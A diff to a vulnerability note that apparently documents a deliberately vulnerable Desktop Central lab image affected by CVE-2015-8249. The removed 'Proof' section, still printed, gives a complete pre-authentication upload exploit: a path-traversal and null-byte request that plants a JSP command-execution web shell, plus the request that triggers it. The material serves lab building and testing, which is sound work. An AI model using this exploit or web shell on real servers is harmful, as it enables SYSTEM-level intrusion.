@@ -7,8 +7,6 @@
 - **CVE-2015-8249** — Pre-authentication arbitrary file upload in the `FileUploadServlet`
   endpoint of ManageEngine Desktop Central prior to build 91100, leading directly to
   RCE as the Desktop Central service account (`LocalSystem` by default).
-- Publicly weaponized as Metasploit module
-  `exploit/windows/http/manageengine_connectionid_write`.
 
 ## Description
 Desktop Central's `FileUploadServlet` accepts unauthenticated uploads and concatenates
@@ -18,8 +16,8 @@ segments and a `.jsp` body; the servlet writes the request body to a directory s
 by the bundled Tomcat and the JSP is executed on next request.
 
 The Rapid7 mirror this image installs from serves a version-less object; what it
-actually lays down reports `buildnumber=91084` in `conf\product.conf`, sixteen builds
-behind the fix (91100). The admin console is left on 8020/TCP bound to `0.0.0.0`.
+actually lays down reports `buildnumber=91084` in `conf\product.conf`, which is in the
+affected range. The admin console is left on 8020/TCP bound to `0.0.0.0`.
 
 ## Affected Service
 - **Install root:** `C:\ManageEngine\DesktopCentral_Server` (bundled Tomcat + PostgreSQL)
@@ -36,31 +34,6 @@ behind the fix (91100). The admin console is left on 8020/TCP bound to `0.0.0.0`
   to `com.adventnet.sym.webclient.common.FileUploadServlet`; the
   `/agent/connection/download/FileUploadServlet` path quoted by some CVE write-ups is
   **404 here**.
-
-## Proof
-`doPost` reads five parameters, and all five matter: `customerId` goes through
-`Long.parseLong`, so a request that omits it throws before anything is written, and
-`getFileFolderPath()` only produces a path when `action` is `rds_file_upload`. The
-request body is copied straight from `request.getInputStream()` — it is never parsed
-as multipart, so no MIME framing is required.
-
-```
-POST /fileupload?connectionId=../../../../../../shell.jsp%00&resourceId=1&action=rds_file_upload&computerName=X&customerId=1 HTTP/1.1
-Host: <target>:8020
-Content-Type: application/octet-stream
-Content-Length: ...
-
-<%@ page import="java.util.*,java.io.*"%><% Runtime.getRuntime().exec(request.getParameter("c")); %>
-```
-The servlet writes to
-`<serverDataDir>\rds\scr-rec\<user>-<computerName>-<connectionId>.7z`. Because
-`<user>-<computerName>-` is glued to the front of `connectionId`, the first `../`
-only cancels that prefix, so **six** are needed to climb out of
-`webapps\DesktopCentral\server-data\<customerId>\rds\scr-rec` into
-`webapps\DesktopCentral`. The trailing `.7z` is truncated by the bundled JRE's
-null byte handling, so the file lands as a real `.jsp`.
-
-Then `GET /shell.jsp?c=whoami` runs as `NT AUTHORITY\SYSTEM`.
 
 ## Constraints
 - This host has no outbound network access and no `.ppm` service pack is staged on it.
